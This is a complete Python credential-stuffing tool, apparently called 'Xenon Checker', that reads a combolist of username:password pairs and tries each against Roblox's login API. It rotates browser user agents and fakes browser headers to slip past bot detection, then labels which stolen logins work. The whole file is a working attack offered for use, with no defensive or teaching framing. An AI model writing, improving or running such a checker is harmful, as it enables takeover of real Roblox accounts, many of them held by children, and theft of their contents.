import requests
from colorama import Fore
from time import sleep
import os
import random

# ألوان للعرض
magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET

print(f"[*] {magenta}Connecting...{reset}")
sleep(2)
print(f"[*] {magenta}Connected!{reset}\n\n")

os.system("clear")
print(f"""{magenta}
▒██   ██▒▓█████  ███▄    █  ▒█████   ███▄    █     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░░  █   ░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░     ░      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░    ░     ░  ░         ░     ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                                  ░                       ░                               
{reset}""")

comboName = str(input(f"{magenta}Combolist name: {reset}"))
combolist = open(comboName + ".txt", "r").readlines()

# قائمة بوكلاء مستخدم حقيقية لمحاكاة متصفحات مختلفة
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

session = requests.Session()
login_url = "https://auth.roblox.com/v2/login"

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(":")
    username = acc[0]
    password = acc[1]

    # ترويسات أكثر واقعية
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://www.roblox.com",
        "Connection": "keep-alive",
        "Referer": "https://www.roblox.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "TE": "trailers"
    }

    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }

    try:
        r = session.post(login_url, json=payload, headers=headers, timeout=10)
        
        if r.status_code == 200 and "user" in r.text:
            print(f"[✔] {green}GOOD: {username}:{password}{reset}")
        else:
            print(f"[✘] {red}BAD: {username}:{password}{reset}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] {red}Error with {username}:{password} - {str(e)}{reset}")